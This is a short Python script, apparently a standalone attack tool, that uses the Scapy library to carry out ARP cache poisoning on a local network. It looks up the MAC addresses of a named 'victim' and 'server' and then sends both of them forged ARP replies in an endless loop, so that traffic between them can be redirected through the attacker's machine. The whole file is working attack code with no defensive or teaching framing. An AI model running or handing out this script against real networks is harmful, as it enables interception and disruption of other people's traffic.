from scapy.all import *

interface = "en0"
server_ip = "192.168.1.107"
victim_ip = "192.168.1.104"
packet_count = 1000

def get_mac(ip_address):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
    for s, r in ans:
        return r[Ether].src
    return None

conf.iface = interface
conf.verb = 0

victim_mac = get_mac(victim_ip)
server_mac = get_mac(server_ip)

poison_server = ARP()
poison_server.op = 2
poison_server.psrc = victim_ip
poison_server.pdst = server_ip
poison_server.hwdst = server_mac

poison_victim = ARP()
poison_victim.op = 2
poison_victim.psrc = server_ip
poison_victim.pdst = victim_ip
poison_victim.hwdst = victim_mac

while True:
    send(poison_server)
    send(poison_victim)
    time.sleep(2)
    print("Poisoning...")

